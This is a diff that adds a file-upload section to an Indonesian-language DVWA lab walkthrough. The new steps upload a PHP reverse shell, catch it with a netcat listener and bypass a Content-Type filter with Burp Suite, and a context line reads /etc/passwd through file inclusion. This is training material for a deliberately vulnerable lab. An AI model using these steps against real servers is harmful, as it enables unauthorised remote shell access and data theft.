@@ -116,6 +116,40 @@ Membuka isi file **/etc/passwd** di server
 http://<IP_Server>/DVWA/vulnerabilities/fi/?page=file:///etc/passwd
 ```
 
+## File Upload
+File upload vulnerabilities terjadi ketika server web mengizinkan pengguna untuk mengunggah file ke sistem tanpa memvalidasi hal-hal penting seperti nama, type, konten, atau ukurannya.
+
+- Sebelumnya melakukan uji serangan, download terlebih dahulu file PHP reverse shell di https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php kemudian ubah IP menjadi IP Komputer yang anda gunakan dan port sesuai kebutuhan
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2023.JPG)
+
+- Buat sebuah listener untuk terhubung ke reverse shell dan pastikan port yang digunakan sama dengan port di file php reverse shell diatas
+```sh
+nc -lnvp <port>
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2024.JPG)
+
+### Security Low
+- Upload file **php-reverse-shell.php** ke halaman web
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2021.JPG)
+
+- Untuk menjalankan file **php-reverse-shell.php** di server, cukup buka url tempat file tersimpan di tab baru pada browser maka netcat berhasil terhubung
+```sh
+http://<IP_Server>/DVWA/hackable/uploads/php-reverse-shell.php
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2022.JPG)
+
+### Security Medium
+- Gunakan tool Burp Suite untuk mengubah **Content-Type: application/x-php** menjadi **Content-Type: image/jpeg**
+
+![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/dt%2025.JPG)
+
+- Jalankan file **php-reverse-shell.php** seperti pada langkah sebelumnya
+
+
 ## SQL Injection
 SQL Injection (SQLi) adalah celah keamanan web yang memungkinkan penyerang mengintruksi query yang dibuat aplikasi untuk melihat data yang biasanya tidak dapat mereka ambil, misalnya data pengguna lain atau data lain apapun yang dapat diakses oleh aplikasi itu sendiri
 
